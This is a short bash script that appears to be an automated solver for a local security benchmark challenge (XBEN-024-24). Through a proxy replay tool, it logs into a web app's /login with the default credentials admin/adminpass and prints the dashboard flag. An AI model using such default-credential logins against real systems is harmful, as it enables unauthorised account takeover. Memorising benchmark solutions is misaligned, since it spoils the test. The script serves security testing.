#!/usr/bin/env bash
# XBEN-024-24 — default credentials. Proxy-mode twin. The admin account ships
# with a known password; logging in as admin/adminpass reaches the dashboard,
# which holds the flag.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben024p-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/login"
BASE="$(req_of GET login)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/login' \
  --set 'form.username=admin' --set 'form.password=adminpass' >/dev/null
print_flag
